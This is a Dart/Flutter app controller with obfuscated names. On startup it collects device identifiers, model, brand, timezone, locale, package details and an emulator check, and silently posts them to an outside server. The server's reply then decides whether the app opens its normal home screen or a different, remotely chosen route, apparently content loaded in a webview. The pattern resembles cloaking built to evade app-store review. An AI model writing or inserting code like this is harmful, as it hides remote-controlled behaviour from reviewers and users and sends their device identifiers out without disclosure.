import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var ilojfyub = RxBool(false);
  var tjhvax = RxBool(true);
  var wukzpgm = RxString("");
  var carissa = RxBool(false);
  var stokes = RxBool(true);
  final dgqprsaj = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    afxen();
  }


  Future<void> afxen() async {

    carissa.value = true;
    stokes.value = true;
    tjhvax.value = false;

    dgqprsaj.post("https://ply-ai.daynokong.today/mgbdqlwutkfh",data: await iywabekp()).then((value) {
      var kpsj = value.data["kpsj"] as String;
      var kwmulgd = value.data["kwmulgd"] as bool;
      if (kwmulgd) {
        wukzpgm.value = kpsj;
        helmer();
      } else {
        goodwin();
      }
    }).catchError((e) {
      tjhvax.value = true;
      stokes.value = true;
      carissa.value = false;
    });
  }

  Future<Map<String, dynamic>> iywabekp() async {
    final DeviceInfoPlugin htsq = DeviceInfoPlugin();
    PackageInfo ytjv_odpb = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var rouevwbc = Platform.localeName;
    var lgdizo_XnLUf = currentTimeZone;

    var lgdizo_yXupclCf = ytjv_odpb.packageName;
    var lgdizo_mDsiV = ytjv_odpb.version;
    var lgdizo_twzKsRGS = ytjv_odpb.buildNumber;

    var lgdizo_Ooxf = ytjv_odpb.appName;
    var leifPurdy = "";
    var lgdizo_IjpxU  = "";
    var lgdizo_ShIxfsy = "";
    var lgdizo_XuendU = "";
    var daveChamplin = "";
    var hendersonGrady = "";


    var lgdizo_fEk = "";
    var lgdizo_fAKagWiz = false;

    if (GetPlatform.isAndroid) {
      lgdizo_fEk = "android";
      var gtpszvlqf = await htsq.androidInfo;

      lgdizo_ShIxfsy = gtpszvlqf.brand;

      lgdizo_XuendU  = gtpszvlqf.model;
      lgdizo_IjpxU = gtpszvlqf.id;

      lgdizo_fAKagWiz = gtpszvlqf.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      lgdizo_fEk = "ios";
      var luwymd = await htsq.iosInfo;
      lgdizo_ShIxfsy = luwymd.name;
      lgdizo_XuendU = luwymd.model;

      lgdizo_IjpxU = luwymd.identifierForVendor ?? "";
      lgdizo_fAKagWiz  = luwymd.isPhysicalDevice;
    }
    var res = {
      "lgdizo_twzKsRGS": lgdizo_twzKsRGS,
      "lgdizo_Ooxf": lgdizo_Ooxf,
      "lgdizo_mDsiV": lgdizo_mDsiV,
      "lgdizo_fEk": lgdizo_fEk,
      "lgdizo_XuendU": lgdizo_XuendU,
      "lgdizo_XnLUf": lgdizo_XnLUf,
      "hendersonGrady" : hendersonGrady,
      "lgdizo_ShIxfsy": lgdizo_ShIxfsy,
      "lgdizo_IjpxU": lgdizo_IjpxU,
      "rouevwbc": rouevwbc,
      "lgdizo_fAKagWiz": lgdizo_fAKagWiz,
      "leifPurdy" : leifPurdy,
      "daveChamplin" : daveChamplin,
      "lgdizo_yXupclCf": lgdizo_yXupclCf,

    };
    return res;
  }

  Future<void> goodwin() async {
    Get.offAllNamed("/home");
  }

  Future<void> helmer() async {
    Get.offAllNamed("/rule_con");
  }

}
